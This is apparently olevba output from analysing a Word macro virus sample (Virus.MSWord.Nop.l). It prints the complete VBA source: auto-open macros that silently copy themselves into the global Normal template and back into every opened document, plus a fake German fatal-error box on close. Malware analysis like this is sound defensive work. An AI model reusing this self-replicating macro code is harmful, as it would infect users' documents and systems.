olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nop.l-d9db33b28b0a3bb9a4cc031cc16a927c641a2a42
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nop.l-d9db33b28b0a3bb9a4cc031cc16a927c641a2a42 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Nop.l-d9db33b28b0a3bb9a4cc031cc16a927c641a2a42 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.MsgBox "Kann auf Gerät nicht schreiben!", "Schwerer Ausnahmefehler!", 21
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Nop.l-d9db33b28b0a3bb9a4cc031cc16a927c641a2a42 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim m$
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
m$ = WordBasic.[FileName$]() + ":AutoClose"
WordBasic.MacroCopy m$, "Global:AutoClose"
m$ = WordBasic.[FileName$]() + ":AO"
WordBasic.MacroCopy m$, "Global:AutoOpen"
m$ = WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy m$, "Global:AO"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AO.bas 
in file: Virus.MSWord.Nop.l-d9db33b28b0a3bb9a4cc031cc16a927c641a2a42 - OLE stream: 'Macros/VBA/AO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim m$
Dim n$
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
m$ = WordBasic.[FileName$]() + ":AutoClose"
WordBasic.MacroCopy "Global:AutoClose", m$
m$ = WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy "Global:AO", m$
m$ = WordBasic.[FileName$]() + ":AO"
WordBasic.MacroCopy "Global:AutoOpen", m$
n$ = WordBasic.[FileName$]()
WordBasic.FileSaveAs Name:=n$, Format:=1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

